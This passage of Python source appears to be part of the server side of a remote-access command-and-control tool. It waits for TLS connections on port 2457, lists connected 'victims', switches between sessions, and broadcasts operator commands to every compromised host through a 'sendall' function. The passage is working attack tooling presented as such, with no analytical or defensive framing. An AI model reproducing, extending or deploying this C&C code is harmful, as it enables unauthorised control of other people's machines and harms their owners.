    if codedCommandSplit[2:]:
        for strg in codedCommandSplit[2:]:
            stringformed += ' ' + strg

    codedCommand = stringformed
    sess = 0
    for target in victims['target']:
        target.send(f"{codedCommand}".encode())

        resp = target.recv(1024)
        if "done".encode() in resp or "end".encode() in resp or "n".encode() in resp or "successfully".encode() in resp:
            print(f"\n\t{B}Info: {Y}Command sent successfully on session {sess}-{victims['ip'][sess]}\n")
            #print(f"{Y}Response: {B}{respComm}")
            continue
        else:
            print(f"\n\t{R}ERROR: {Y}Command sent UnSuccessfully on session {sess}-{victims['ip'][sess]}\n")
        sess += 1


def server(serverSock):
    prompt = f"{Y}<*{R} C&C {Y}*>: {END}"
    connThread = threading.Thread(target=start, args=(serverSock,prompt))
    connThread.start()

    while True:
        cmd = session.prompt(ANSI(prompt))

        if "victims" in cmd or 'targets' in cmd:
            printVictims(prompt)

        elif "session" in cmd or "target" in cmd:
            setSession(cmd)

        elif "sendall" in cmd:
            sendAll(cmd)

        else:
            continue


if __name__ == "__main__":
    if not os.path.exists("./DATA"):
        os.makedirs("./DATA")
    print(f"{Y}[!>] {R}Waiting For incoming Conections...{END}")
    serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    serverSock.bind(('0.0.0.0', 2457))
    serverSock.listen(5)
    serverSock = context.wrap_socket(serverSock)
    server(serverSock)
